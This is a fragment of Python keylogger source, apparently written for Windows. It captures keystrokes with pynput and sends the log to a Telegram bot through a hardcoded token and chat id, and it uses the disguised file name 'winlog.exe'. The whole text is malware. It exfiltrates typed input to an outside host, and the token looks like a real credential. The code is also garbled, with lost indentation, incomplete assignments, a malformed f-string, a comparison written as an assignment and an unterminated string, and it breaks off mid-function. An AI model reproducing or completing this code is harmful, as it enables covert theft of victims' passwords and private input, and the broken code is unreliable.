from pynput import keyboard
import requests
import threading
import os
import shutil
import sys
import winreg
import ctypes
# Config
bot_token = "7346105462:AAHDnVog4IqAwLkEtxVarsmljidamcOEGZY"
chat_id = 1342528583
interval = 60
filename = "winlog.exe"
log =
#--- Send to Telegram ---

def send_log(message):
url = f"https://api.telegram.org/bot{7346105462:AAHDnVog4IqAwLkEtxVarsmljidamcOEGZY}/sendMessage"
data = {'chat_id': chat_id, 'text': message}
try:
requests.post(url, data=data)
except:
pass
Key logger
def on_press(key):
global log
try:
log += key.char
except AttributeError:
if key = key.space:
log +=
else:
log += f' [{key}]